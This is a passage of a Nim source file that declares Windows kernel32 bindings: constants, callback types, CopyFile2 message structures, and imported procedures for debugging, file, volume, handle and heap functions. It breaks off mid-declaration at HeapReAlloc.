QUERY_ACTCTX_FLAG_USE_ACTIVE_ACTCTX* = 0x00000004  QUERY_ACTCTX_FLAG_ACTCTX_IS_HMODULE* = 0x00000008  QUERY_ACTCTX_FLAG_ACTCTX_IS_ADDRESS* = 0x00000010  QUERY_ACTCTX_FLAG_NO_ADDREF* = 0x80000000'i32  RESTART_MAX_CMD_LINE* = 1024  RESTART_NO_CRASH* = 1  RESTART_NO_HANG* = 2  RESTART_NO_PATCH* = 4  RESTART_NO_REBOOT* = 8  RECOVERY_DEFAULT_PING_INTERVAL* = 5000  RECOVERY_MAX_PING_INTERVAL* = 5*60*1000  ioPriorityHintVeryLow* = 0  ioPriorityHintLow* = 1  ioPriorityHintNormal* = 2  maximumIoPriorityHintType* = 3  STORAGE_INFO_FLAGS_ALIGNED_DEVICE* = 0x00000001  STORAGE_INFO_FLAGS_PARTITION_ALIGNED_ON_DEVICE* = 0x00000002  STORAGE_INFO_OFFSET_UNKNOWN* = 0xffffffff'i32  REMOTE_PROTOCOL_INFO_FLAG_LOOPBACK* = 0x00000001  REMOTE_PROTOCOL_INFO_FLAG_OFFLINE* = 0x00000002  REMOTE_PROTOCOL_INFO_FLAG_PERSISTENT_HANDLE* = 0x00000004  RPI_FLAG_SMB2_SHARECAP_TIMEWARP* = 0x00000002  RPI_FLAG_SMB2_SHARECAP_DFS* = 0x00000008  RPI_FLAG_SMB2_SHARECAP_CONTINUOUS_AVAILABILITY* = 0x00000010  RPI_FLAG_SMB2_SHARECAP_SCALEOUT* = 0x00000020  RPI_FLAG_SMB2_SHARECAP_CLUSTER* = 0x00000040  RPI_SMB2_FLAG_SERVERCAP_DFS* = 0x00000001  RPI_SMB2_FLAG_SERVERCAP_LEASING* = 0x00000002  RPI_SMB2_FLAG_SERVERCAP_LARGEMTU* = 0x00000004  RPI_SMB2_FLAG_SERVERCAP_MULTICHANNEL* = 0x00000008  RPI_SMB2_FLAG_SERVERCAP_PERSISTENT_HANDLES* = 0x00000010  RPI_SMB2_FLAG_SERVERCAP_DIRECTORY_LEASING* = 0x00000020  fileIdType* = 0  objectIdType* = 1  extendedFileIdType* = 2  maximumFileIdType* = 3  SYMBOLIC_LINK_FLAG_DIRECTORY* = 0x1  VALID_SYMBOLIC_LINK_FLAGS* = SYMBOLIC_LINK_FLAG_DIRECTORY  INVALID_HANDLE_VALUE* = HANDLE(-1)type  LPOVERLAPPED_COMPLETION_ROUTINE* = proc (dwErrorCode: DWORD, dwNumberOfBytesTransfered: DWORD, lpOverlapped: LPOVERLAPPED): VOID {.stdcall.}  BEM_FREE_INTERFACE_CALLBACK* = proc (interfaceInstance: pointer): void {.stdcall.}  PRESTORE_LAST_ERROR* = proc (P1: DWORD): VOID {.stdcall.}  ENUMRESLANGPROCA* = proc (hModule: HMODULE, lpType: LPCSTR, lpName: LPCSTR, wLanguage: WORD, lParam: LONG_PTR): WINBOOL {.stdcall.}  ENUMRESLANGPROCW* = proc (hModule: HMODULE, lpType: LPCWSTR, lpName: LPCWSTR, wLanguage: WORD, lParam: LONG_PTR): WINBOOL {.stdcall.}  ENUMRESNAMEPROCA* = proc (hModule: HMODULE, lpType: LPCSTR, lpName: LPSTR, lParam: LONG_PTR): WINBOOL {.stdcall.}  ENUMRESNAMEPROCW* = proc (hModule: HMODULE, lpType: LPCWSTR, lpName: LPWSTR, lParam: LONG_PTR): WINBOOL {.stdcall.}  ENUMRESTYPEPROCA* = proc (hModule: HMODULE, lpType: LPSTR, lParam: LONG_PTR): WINBOOL {.stdcall.}  ENUMRESTYPEPROCW* = proc (hModule: HMODULE, lpType: LPWSTR, lParam: LONG_PTR): WINBOOL {.stdcall.}  PGET_MODULE_HANDLE_EXA* = proc (dwFlags: DWORD, lpModuleName: LPCSTR, phModule: ptr HMODULE): WINBOOL {.stdcall.}  PGET_MODULE_HANDLE_EXW* = proc (dwFlags: DWORD, lpModuleName: LPCWSTR, phModule: ptr HMODULE): WINBOOL {.stdcall.}  PINIT_ONCE_FN* = proc (InitOnce: PINIT_ONCE, Parameter: PVOID, Context: ptr PVOID): WINBOOL {.stdcall.}  PTIMERAPCROUTINE* = proc (lpArgToCompletionRoutine: LPVOID, dwTimerLowValue: DWORD, dwTimerHighValue: DWORD): VOID {.stdcall.}  PTP_WIN32_IO_CALLBACK* = proc (Instance: PTP_CALLBACK_INSTANCE, Context: PVOID, Overlapped: PVOID, IoResult: ULONG, NumberOfBytesTransferred: ULONG_PTR, Io: PTP_IO): VOID {.stdcall.}  PFE_EXPORT_FUNC* = proc (pbData: PBYTE, pvCallbackContext: PVOID, ulLength: ULONG): DWORD {.stdcall.}  PFE_IMPORT_FUNC* = proc (pbData: PBYTE, pvCallbackContext: PVOID, ulLength: PULONG): DWORD {.stdcall.}  PGET_SYSTEM_WOW64_DIRECTORY_A* = proc (lpBuffer: LPSTR, uSize: UINT): UINT {.stdcall.}  PGET_SYSTEM_WOW64_DIRECTORY_W* = proc (lpBuffer: LPWSTR, uSize: UINT): UINT {.stdcall.}  LPPROGRESS_ROUTINE* = proc (TotalFileSize: LARGE_INTEGER, TotalBytesTransferred: LARGE_INTEGER, StreamSize: LARGE_INTEGER, StreamBytesTransferred: LARGE_INTEGER, dwStreamNumber: DWORD, dwCallbackReason: DWORD, hSourceFile: HANDLE, hDestinationFile: HANDLE, lpData: LPVOID): DWORD {.stdcall.}  COPYFILE2_MESSAGE_Info_ChunkStarted* {.pure.} = object    dwStreamNumber*: DWORD    dwReserved*: DWORD    hSourceFile*: HANDLE    hDestinationFile*: HANDLE    uliChunkNumber*: ULARGE_INTEGER    uliChunkSize*: ULARGE_INTEGER    uliStreamSize*: ULARGE_INTEGER    uliTotalFileSize*: ULARGE_INTEGER  COPYFILE2_MESSAGE_Info_ChunkFinished* {.pure.} = object    dwStreamNumber*: DWORD    dwFlags*: DWORD    hSourceFile*: HANDLE    hDestinationFile*: HANDLE    uliChunkNumber*: ULARGE_INTEGER    uliChunkSize*: ULARGE_INTEGER    uliStreamSize*: ULARGE_INTEGER    uliStreamBytesTransferred*: ULARGE_INTEGER    uliTotalFileSize*: ULARGE_INTEGER    uliTotalBytesTransferred*: ULARGE_INTEGER  COPYFILE2_MESSAGE_Info_StreamStarted* {.pure.} = object    dwStreamNumber*: DWORD    dwReserved*: DWORD    hSourceFile*: HANDLE    hDestinationFile*: HANDLE    uliStreamSize*: ULARGE_INTEGER    uliTotalFileSize*: ULARGE_INTEGER  COPYFILE2_MESSAGE_Info_StreamFinished* {.pure.} = object    dwStreamNumber*: DWORD    dwReserved*: DWORD    hSourceFile*: HANDLE    hDestinationFile*: HANDLE    uliStreamSize*: ULARGE_INTEGER    uliStreamBytesTransferred*: ULARGE_INTEGER    uliTotalFileSize*: ULARGE_INTEGER    uliTotalBytesTransferred*: ULARGE_INTEGER  COPYFILE2_MESSAGE_Info_PollContinue* {.pure.} = object    dwReserved*: DWORD  COPYFILE2_MESSAGE_Info_Error* {.pure.} = object    CopyPhase*: COPYFILE2_COPY_PHASE    dwStreamNumber*: DWORD    hrFailure*: HRESULT    dwReserved*: DWORD    uliChunkNumber*: ULARGE_INTEGER    uliStreamSize*: ULARGE_INTEGER    uliStreamBytesTransferred*: ULARGE_INTEGER    uliTotalFileSize*: ULARGE_INTEGER    uliTotalBytesTransferred*: ULARGE_INTEGER  COPYFILE2_MESSAGE_Info* {.pure, union.} = object    ChunkStarted*: COPYFILE2_MESSAGE_Info_ChunkStarted    ChunkFinished*: COPYFILE2_MESSAGE_Info_ChunkFinished    StreamStarted*: COPYFILE2_MESSAGE_Info_StreamStarted    StreamFinished*: COPYFILE2_MESSAGE_Info_StreamFinished    PollContinue*: COPYFILE2_MESSAGE_Info_PollContinue    Error*: COPYFILE2_MESSAGE_Info_Error  COPYFILE2_MESSAGE* {.pure.} = object    Type*: COPYFILE2_MESSAGE_TYPE    dwPadding*: DWORD    Info*: COPYFILE2_MESSAGE_Info  PCOPYFILE2_PROGRESS_ROUTINE* = proc (pMessage: ptr COPYFILE2_MESSAGE, pvCallbackContext: PVOID): COPYFILE2_MESSAGE_ACTION {.stdcall.}  PQUERYACTCTXW_FUNC* = proc (dwFlags: DWORD, hActCtx: HANDLE, pvSubInstance: PVOID, ulInfoClass: ULONG, pvBuffer: PVOID, cbBuffer: SIZE_T, pcbWrittenOrRequired: ptr SIZE_T): WINBOOL {.stdcall.}  APPLICATION_RECOVERY_CALLBACK* = proc (pvParameter: PVOID): DWORD {.stdcall.}  COPYFILE2_EXTENDED_PARAMETERS* {.pure.} = object    dwSize*: DWORD    dwCopyFlags*: DWORD    pfCancel*: ptr WINBOOL    pProgressRoutine*: PCOPYFILE2_PROGRESS_ROUTINE    pvCallbackContext*: PVOIDproc IsDebuggerPresent*(): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc OutputDebugStringA*(lpOutputString: LPCSTR): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc OutputDebugStringW*(lpOutputString: LPCWSTR): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc DebugBreak*(): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc ContinueDebugEvent*(dwProcessId: DWORD, dwThreadId: DWORD, dwContinueStatus: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc WaitForDebugEvent*(lpDebugEvent: LPDEBUG_EVENT, dwMilliseconds: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc DebugActiveProcess*(dwProcessId: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc DebugActiveProcessStop*(dwProcessId: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CheckRemoteDebuggerPresent*(hProcess: HANDLE, pbDebuggerPresent: PBOOL): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc UnhandledExceptionFilter*(ExceptionInfo: ptr EXCEPTION_POINTERS): LONG {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetUnhandledExceptionFilter*(lpTopLevelExceptionFilter: LPTOP_LEVEL_EXCEPTION_FILTER): LPTOP_LEVEL_EXCEPTION_FILTER {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetErrorMode*(uMode: UINT): UINT {.winapi, stdcall, dynlib: "kernel32", importc.}proc AddVectoredExceptionHandler*(First: ULONG, Handler: PVECTORED_EXCEPTION_HANDLER): PVOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc RemoveVectoredExceptionHandler*(Handle: PVOID): ULONG {.winapi, stdcall, dynlib: "kernel32", importc.}proc AddVectoredContinueHandler*(First: ULONG, Handler: PVECTORED_EXCEPTION_HANDLER): PVOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc RemoveVectoredContinueHandler*(Handle: PVOID): ULONG {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetErrorMode*(): UINT {.winapi, stdcall, dynlib: "kernel32", importc.}proc RestoreLastError*(dwErrCode: DWORD): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc RaiseException*(dwExceptionCode: DWORD, dwExceptionFlags: DWORD, nNumberOfArguments: DWORD, lpArguments: ptr ULONG_PTR): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetLastError*(): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetLastError*(dwErrCode: DWORD): VOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc FlsAlloc*(lpCallback: PFLS_CALLBACK_FUNCTION): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc FlsGetValue*(dwFlsIndex: DWORD): PVOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc FlsSetValue*(dwFlsIndex: DWORD, lpFlsData: PVOID): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc FlsFree*(dwFlsIndex: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc IsThreadAFiber*(): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CompareFileTime*(lpFileTime1: ptr FILETIME, lpFileTime2: ptr FILETIME): LONG {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateFileA*(lpFileName: LPCSTR, dwDesiredAccess: DWORD, dwShareMode: DWORD, lpSecurityAttributes: LPSECURITY_ATTRIBUTES, dwCreationDisposition: DWORD, dwFlagsAndAttributes: DWORD, hTemplateFile: HANDLE): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateFileW*(lpFileName: LPCWSTR, dwDesiredAccess: DWORD, dwShareMode: DWORD, lpSecurityAttributes: LPSECURITY_ATTRIBUTES, dwCreationDisposition: DWORD, dwFlagsAndAttributes: DWORD, hTemplateFile: HANDLE): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc DefineDosDeviceW*(dwFlags: DWORD, lpDeviceName: LPCWSTR, lpTargetPath: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc DeleteVolumeMountPointW*(lpszVolumeMountPoint: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc FileTimeToLocalFileTime*(lpFileTime: ptr FILETIME, lpLocalFileTime: LPFILETIME): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc FindCloseChangeNotification*(hChangeHandle: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc FindFirstChangeNotificationA*(lpPathName: LPCSTR, bWatchSubtree: WINBOOL, dwNotifyFilter: DWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc FindFirstChangeNotificationW*(lpPathName: LPCWSTR, bWatchSubtree: WINBOOL, dwNotifyFilter: DWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc FindFirstFileA*(lpFileName: LPCSTR, lpFindFileData: LPWIN32_FIND_DATAA): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc FindFirstFileW*(lpFileName: LPCWSTR, lpFindFileData: LPWIN32_FIND_DATAW): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc FindFirstVolumeW*(lpszVolumeName: LPWSTR, cchBufferLength: DWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc FindNextChangeNotification*(hChangeHandle: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc FindNextVolumeW*(hFindVolume: HANDLE, lpszVolumeName: LPWSTR, cchBufferLength: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc FindVolumeClose*(hFindVolume: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetDiskFreeSpaceA*(lpRootPathName: LPCSTR, lpSectorsPerCluster: LPDWORD, lpBytesPerSector: LPDWORD, lpNumberOfFreeClusters: LPDWORD, lpTotalNumberOfClusters: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetDiskFreeSpaceW*(lpRootPathName: LPCWSTR, lpSectorsPerCluster: LPDWORD, lpBytesPerSector: LPDWORD, lpNumberOfFreeClusters: LPDWORD, lpTotalNumberOfClusters: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetDriveTypeA*(lpRootPathName: LPCSTR): UINT {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetDriveTypeW*(lpRootPathName: LPCWSTR): UINT {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetFileAttributesA*(lpFileName: LPCSTR): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetFileAttributesW*(lpFileName: LPCWSTR): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetFileInformationByHandle*(hFile: HANDLE, lpFileInformation: LPBY_HANDLE_FILE_INFORMATION): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetFileSize*(hFile: HANDLE, lpFileSizeHigh: LPDWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetFileSizeEx*(hFile: HANDLE, lpFileSize: PLARGE_INTEGER): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetFileTime*(hFile: HANDLE, lpCreationTime: LPFILETIME, lpLastAccessTime: LPFILETIME, lpLastWriteTime: LPFILETIME): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetFileType*(hFile: HANDLE): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetFullPathNameA*(lpFileName: LPCSTR, nBufferLength: DWORD, lpBuffer: LPSTR, lpFilePart: ptr LPSTR): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetFullPathNameW*(lpFileName: LPCWSTR, nBufferLength: DWORD, lpBuffer: LPWSTR, lpFilePart: ptr LPWSTR): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetLogicalDrives*(): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetLogicalDriveStringsW*(nBufferLength: DWORD, lpBuffer: LPWSTR): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetLongPathNameA*(lpszShortPath: LPCSTR, lpszLongPath: LPSTR, cchBuffer: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetLongPathNameW*(lpszShortPath: LPCWSTR, lpszLongPath: LPWSTR, cchBuffer: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetShortPathNameW*(lpszLongPath: LPCWSTR, lpszShortPath: LPWSTR, cchBuffer: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetTempFileNameW*(lpPathName: LPCWSTR, lpPrefixString: LPCWSTR, uUnique: UINT, lpTempFileName: LPWSTR): UINT {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetVolumeInformationW*(lpRootPathName: LPCWSTR, lpVolumeNameBuffer: LPWSTR, nVolumeNameSize: DWORD, lpVolumeSerialNumber: LPDWORD, lpMaximumComponentLength: LPDWORD, lpFileSystemFlags: LPDWORD, lpFileSystemNameBuffer: LPWSTR, nFileSystemNameSize: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetVolumePathNameW*(lpszFileName: LPCWSTR, lpszVolumePathName: LPWSTR, cchBufferLength: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc LocalFileTimeToFileTime*(lpLocalFileTime: ptr FILETIME, lpFileTime: LPFILETIME): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc LockFile*(hFile: HANDLE, dwFileOffsetLow: DWORD, dwFileOffsetHigh: DWORD, nNumberOfBytesToLockLow: DWORD, nNumberOfBytesToLockHigh: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc QueryDosDeviceW*(lpDeviceName: LPCWSTR, lpTargetPath: LPWSTR, ucchMax: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc ReadFileEx*(hFile: HANDLE, lpBuffer: LPVOID, nNumberOfBytesToRead: DWORD, lpOverlapped: LPOVERLAPPED, lpCompletionRoutine: LPOVERLAPPED_COMPLETION_ROUTINE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc ReadFileScatter*(hFile: HANDLE, aSegmentArray: ptr FILE_SEGMENT_ELEMENT, nNumberOfBytesToRead: DWORD, lpReserved: LPDWORD, lpOverlapped: LPOVERLAPPED): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetFilePointer*(hFile: HANDLE, lDistanceToMove: LONG, lpDistanceToMoveHigh: PLONG, dwMoveMethod: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetFileTime*(hFile: HANDLE, lpCreationTime: ptr FILETIME, lpLastAccessTime: ptr FILETIME, lpLastWriteTime: ptr FILETIME): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetFileValidData*(hFile: HANDLE, ValidDataLength: LONGLONG): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc UnlockFile*(hFile: HANDLE, dwFileOffsetLow: DWORD, dwFileOffsetHigh: DWORD, nNumberOfBytesToUnlockLow: DWORD, nNumberOfBytesToUnlockHigh: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc WriteFileEx*(hFile: HANDLE, lpBuffer: LPCVOID, nNumberOfBytesToWrite: DWORD, lpOverlapped: LPOVERLAPPED, lpCompletionRoutine: LPOVERLAPPED_COMPLETION_ROUTINE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc WriteFileGather*(hFile: HANDLE, aSegmentArray: ptr FILE_SEGMENT_ELEMENT, nNumberOfBytesToWrite: DWORD, lpReserved: LPDWORD, lpOverlapped: LPOVERLAPPED): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetVolumeNameForVolumeMountPointW*(lpszVolumeMountPoint: LPCWSTR, lpszVolumeName: LPWSTR, cchBufferLength: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetVolumePathNamesForVolumeNameW*(lpszVolumeName: LPCWSTR, lpszVolumePathNames: LPWCH, cchBufferLength: DWORD, lpcchReturnLength: PDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetFinalPathNameByHandleA*(hFile: HANDLE, lpszFilePath: LPSTR, cchFilePath: DWORD, dwFlags: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetFinalPathNameByHandleW*(hFile: HANDLE, lpszFilePath: LPWSTR, cchFilePath: DWORD, dwFlags: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetVolumeInformationByHandleW*(hFile: HANDLE, lpVolumeNameBuffer: LPWSTR, nVolumeNameSize: DWORD, lpVolumeSerialNumber: LPDWORD, lpMaximumComponentLength: LPDWORD, lpFileSystemFlags: LPDWORD, lpFileSystemNameBuffer: LPWSTR, nFileSystemNameSize: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateDirectoryA*(lpPathName: LPCSTR, lpSecurityAttributes: LPSECURITY_ATTRIBUTES): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateDirectoryW*(lpPathName: LPCWSTR, lpSecurityAttributes: LPSECURITY_ATTRIBUTES): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc DeleteFileA*(lpFileName: LPCSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc DeleteFileW*(lpFileName: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc FindClose*(hFindFile: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc FindFirstFileExA*(lpFileName: LPCSTR, fInfoLevelId: FINDEX_INFO_LEVELS, lpFindFileData: LPVOID, fSearchOp: FINDEX_SEARCH_OPS, lpSearchFilter: LPVOID, dwAdditionalFlags: DWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc FindFirstFileExW*(lpFileName: LPCWSTR, fInfoLevelId: FINDEX_INFO_LEVELS, lpFindFileData: LPVOID, fSearchOp: FINDEX_SEARCH_OPS, lpSearchFilter: LPVOID, dwAdditionalFlags: DWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc FindNextFileA*(hFindFile: HANDLE, lpFindFileData: LPWIN32_FIND_DATAA): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc FindNextFileW*(hFindFile: HANDLE, lpFindFileData: LPWIN32_FIND_DATAW): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc FlushFileBuffers*(hFile: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetDiskFreeSpaceExA*(lpDirectoryName: LPCSTR, lpFreeBytesAvailableToCaller: PULARGE_INTEGER, lpTotalNumberOfBytes: PULARGE_INTEGER, lpTotalNumberOfFreeBytes: PULARGE_INTEGER): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetDiskFreeSpaceExW*(lpDirectoryName: LPCWSTR, lpFreeBytesAvailableToCaller: PULARGE_INTEGER, lpTotalNumberOfBytes: PULARGE_INTEGER, lpTotalNumberOfFreeBytes: PULARGE_INTEGER): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetFileAttributesExA*(lpFileName: LPCSTR, fInfoLevelId: GET_FILEEX_INFO_LEVELS, lpFileInformation: LPVOID): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetFileAttributesExW*(lpFileName: LPCWSTR, fInfoLevelId: GET_FILEEX_INFO_LEVELS, lpFileInformation: LPVOID): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetTempPathW*(nBufferLength: DWORD, lpBuffer: LPWSTR): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc LockFileEx*(hFile: HANDLE, dwFlags: DWORD, dwReserved: DWORD, nNumberOfBytesToLockLow: DWORD, nNumberOfBytesToLockHigh: DWORD, lpOverlapped: LPOVERLAPPED): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc ReadFile*(hFile: HANDLE, lpBuffer: LPVOID, nNumberOfBytesToRead: DWORD, lpNumberOfBytesRead: LPDWORD, lpOverlapped: LPOVERLAPPED): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc RemoveDirectoryA*(lpPathName: LPCSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc RemoveDirectoryW*(lpPathName: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetEndOfFile*(hFile: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetFileAttributesA*(lpFileName: LPCSTR, dwFileAttributes: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetFileAttributesW*(lpFileName: LPCWSTR, dwFileAttributes: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetFilePointerEx*(hFile: HANDLE, liDistanceToMove: LARGE_INTEGER, lpNewFilePointer: PLARGE_INTEGER, dwMoveMethod: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc UnlockFileEx*(hFile: HANDLE, dwReserved: DWORD, nNumberOfBytesToUnlockLow: DWORD, nNumberOfBytesToUnlockHigh: DWORD, lpOverlapped: LPOVERLAPPED): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc WriteFile*(hFile: HANDLE, lpBuffer: LPCVOID, nNumberOfBytesToWrite: DWORD, lpNumberOfBytesWritten: LPDWORD, lpOverlapped: LPOVERLAPPED): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetFileInformationByHandle*(hFile: HANDLE, FileInformationClass: FILE_INFO_BY_HANDLE_CLASS, lpFileInformation: LPVOID, dwBufferSize: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc CreateFile2*(lpFileName: LPCWSTR, dwDesiredAccess: DWORD, dwShareMode: DWORD, dwCreationDisposition: DWORD, pCreateExParams: LPCREATEFILE2_EXTENDED_PARAMETERS): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc CloseHandle*(hObject: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc DuplicateHandle*(hSourceProcessHandle: HANDLE, hSourceHandle: HANDLE, hTargetProcessHandle: HANDLE, lpTargetHandle: LPHANDLE, dwDesiredAccess: DWORD, bInheritHandle: WINBOOL, dwOptions: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetHandleInformation*(hObject: HANDLE, lpdwFlags: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc SetHandleInformation*(hObject: HANDLE, dwMask: DWORD, dwFlags: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc HeapCreate*(flOptions: DWORD, dwInitialSize: SIZE_T, dwMaximumSize: SIZE_T): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc.}proc HeapDestroy*(hHeap: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc HeapValidate*(hHeap: HANDLE, dwFlags: DWORD, lpMem: LPCVOID): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc HeapCompact*(hHeap: HANDLE, dwFlags: DWORD): SIZE_T {.winapi, stdcall, dynlib: "kernel32", importc.}proc HeapSummary*(hHeap: HANDLE, dwFlags: DWORD, lpSummary: LPHEAP_SUMMARY): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc GetProcessHeaps*(NumberOfHeaps: DWORD, ProcessHeaps: PHANDLE): DWORD {.winapi, stdcall, dynlib: "kernel32", importc.}proc HeapLock*(hHeap: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc HeapUnlock*(hHeap: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc HeapWalk*(hHeap: HANDLE, lpEntry: LPPROCESS_HEAP_ENTRY): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc HeapSetInformation*(HeapHandle: HANDLE, HeapInformationClass: HEAP_INFORMATION_CLASS, HeapInformation: PVOID, HeapInformationLength: SIZE_T): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc HeapQueryInformation*(HeapHandle: HANDLE, HeapInformationClass: HEAP_INFORMATION_CLASS, HeapInformation: PVOID, HeapInformationLength: SIZE_T, ReturnLength: PSIZE_T): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}proc HeapAlloc*(hHeap: HANDLE, dwFlags: DWORD, dwBytes: SIZE_T): LPVOID {.winapi, stdcall, dynlib: "kernel32", importc.}proc HeapReAlloc*(hHeap: HANDLE, dwFlags: DWORD, lpMem: LPVOID, dwBytes: SIZE_T): LPVOID {.winapi, stdcall, dynlib: "kernel32", 